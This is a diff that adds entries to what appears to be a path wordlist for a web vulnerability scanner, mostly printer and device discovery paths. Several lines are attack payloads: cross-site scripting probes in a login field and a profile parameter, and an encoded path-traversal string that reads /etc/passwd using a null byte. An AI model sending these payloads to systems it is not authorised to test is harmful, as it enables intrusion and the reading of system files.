@@ -27,3 +27,14 @@
 /appliance/login?login[password]={{randstr}}%22%3E%3Csvg/onload=alert(document.domain)%3E&login[use_curr]=1&login[submit]=Change%20Password
 /wp-content/plugins/cmp-coming-soon-maintenance/readme.txt
 /{{paths}}/
+/wlmdeu%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd%00index.htm
+/sessionlist.html
+/etc/mnt_info.csv
+/?profile=</script><script>alert(document.domain)</script>
+/hp/device/this.LCDispatcher?nav=hp.Config
+/info_configuration.html?tab=Home&menu=DevConfig
+/SSI/info_configuration.htm
+/net/net/net.html
+
+/amr
+/eSCL/ScannerCapabilities
